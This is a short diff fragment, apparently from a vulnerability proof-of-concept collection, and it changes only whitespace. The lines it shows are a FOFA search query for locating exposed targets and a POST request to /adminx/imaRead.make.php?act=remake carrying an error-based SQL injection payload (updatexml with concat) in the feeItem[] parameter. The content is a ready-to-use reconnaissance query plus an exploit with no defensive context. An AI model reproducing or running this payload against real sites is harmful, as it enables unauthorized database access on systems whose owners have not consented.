@@ -5,11 +5,11 @@
 
 FOFA:
 
-  body="不要着急，点此"
+    body="不要着急，点此"
 
 POC：
 
-  POST /adminx/imaRead.make.php?act=remake HTTP/1.1
+    POST /adminx/imaRead.make.php?act=remake HTTP/1.1
   
 feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)
 
